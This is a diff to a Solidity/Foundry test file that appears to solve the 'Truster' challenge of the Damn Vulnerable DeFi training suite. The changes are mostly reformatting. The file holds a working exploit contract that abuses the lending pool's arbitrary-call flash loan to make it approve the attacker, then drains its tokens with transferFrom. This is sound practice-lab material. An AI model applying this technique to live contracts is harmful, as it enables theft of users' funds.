@@ -6,14 +6,13 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
-
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -54,17 +53,11 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-            // Deploy exploit contract
-            TrusterExploit exploit = new TrusterExploit();
-            
-            // Execute attack
-            exploit.attack(
-                address(pool),
-                address(token),
-                recovery,
-                TOKENS_IN_POOL
-            );
-                
+        // Deploy exploit contract
+        TrusterExploit exploit = new TrusterExploit();
+
+        // Execute attack
+        exploit.attack(address(pool), address(token), recovery, TOKENS_IN_POOL);
     }
 
     /**
@@ -80,22 +73,11 @@ contract TrusterChallenge is Test {
     }
 }
 
-
-
 contract TrusterExploit {
-    function attack(
-        address pool,
-        address token,
-        address recovery,
-        uint256 amount
-    ) external {
+    function attack(address pool, address token, address recovery, uint256 amount) external {
         // Create the calldata for approve function
-        bytes memory data = abi.encodeWithSignature(
-            "approve(address,uint256)",
-            address(this),
-            amount
-        );
-        
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
+
         // Execute flash loan with 0 amount but use the target call to approve spending
         TrusterLenderPool(pool).flashLoan(
             0, // We don't need to borrow any tokens
@@ -103,10 +85,8 @@ contract TrusterExploit {
             token, // Target is the token contract
             data // The approval calldata
         );
-        
+
         // Transfer all tokens to recovery address
         IERC20(token).transferFrom(pool, recovery, amount);
     }
 }
-
-
